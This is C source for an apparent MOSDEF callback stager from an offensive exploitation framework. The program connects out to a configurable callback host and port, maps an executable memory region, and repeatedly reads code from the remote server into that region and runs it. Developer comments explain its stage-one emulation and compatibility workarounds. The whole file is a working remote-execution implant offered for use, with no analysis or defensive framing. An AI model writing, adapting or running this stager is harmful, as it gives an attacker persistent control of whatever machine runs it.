//
// code compiling with gcc and MOSDEF
//

#include <sys/socket.h>
#include <sys/mman.h>
#include <unistd.h>
#include <arpa/inet.h>
#ifdef __MOSDEF__
# include <mosdef/asm.h>
#endif

#ifdef __MOSDEF__
# define sizeof(struct sockaddr) 16
# define sizeof(len) 4
# define CAST(.*)
#else
# define callptr(ptr) ((void(*)())(ptr))()
# define CAST(cast) (cast)
#endif

#ifndef CBACK_ADDR
# define CBACK_ADDR 0x7f000001
#endif

#ifndef CBACK_PORT
# define CBACK_PORT 50000
#endif


int
main(void)
{
	int ret;
	int len;
	int sock;
	struct sockaddr_storage ss;
	struct sockaddr_in *sin;
	struct sockaddr *sa;
	void * m;
        int i;

	sin = CAST(struct sockaddr_in *)&ss;
	sin->sin_family = AF_INET;
	sin->sin_port = htons(CBACK_PORT);
#ifdef __MOSDEF__
	sin->sin_addr_s_addr = htonl(CBACK_ADDR);
#else
	sin->sin_addr.s_addr = htonl(CBACK_ADDR);
#endif
	sa = CAST(struct sockaddr *)&ss;

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1) {
		_exit(1);
	}

	len = sizeof(struct sockaddr);
	ret = connect(sock, sa, len);
	if (ret == -1) {
		_exit(2);
	}

	ret = read(sock, &len, sizeof(len));
	if (ret < sizeof(len)) {
		_exit(3);
	}

	m = mmap(0, 0x4000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (m == MAP_FAILED) {
		_exit(4);
	}

        // because our linux initial read_exec stub subs from readloc (which comes from pcloc)
        // we want to makes sure we have space above and blow our readloc, this to remain compatible
        // with stack adjusts etc. XXX: doing a cleaner workaround now ;)
        
        // XXX: this fixes dave bug, when running into similar issues, check this issue ;)
        // XXX: note that this only applies when running into any initial read_exec, our
        // XXX: read_and_exec_loop should be ok, as that switches over to it's own mmap
        // m = m + 0x2000;

        // XXX: this code originally had a little quirk in that it closed all the descriptors
        // XXX: and then assumed fd to be 0, instead of doing that, we just emulate the startup
        // XXX: stub as if we received and executed it, and send the fd on the wire


        // XXX: stage 1 emulation
	ret = read(sock, m, len);
	if (ret != len) {
		_exit(5);
	}

# ifdef __SOLARIS_INTEL__
        i = 0;
        ret = write(sock, &i, 4); // emulate syscalltype .. defaults to int91
# endif

        ret = write(sock, &sock, 4);
        // XXX: end of stage 1 emulation

        // read len, and go into MOSDEF mode for real
        // loop this to deal with new school shellservers
        // that start their read_exec loop on the first send ..

        while(1)
        {
	    ret = read(sock, &len, sizeof(len));
	    if (ret < sizeof(len)) 
            {
		_exit(3);
	    }

            ret = read(sock, m, len);
	    if (ret != len) {
		    _exit(5);
	    }
      
	    callptr(m);
        }

	_exit(7);

	return 0;
}
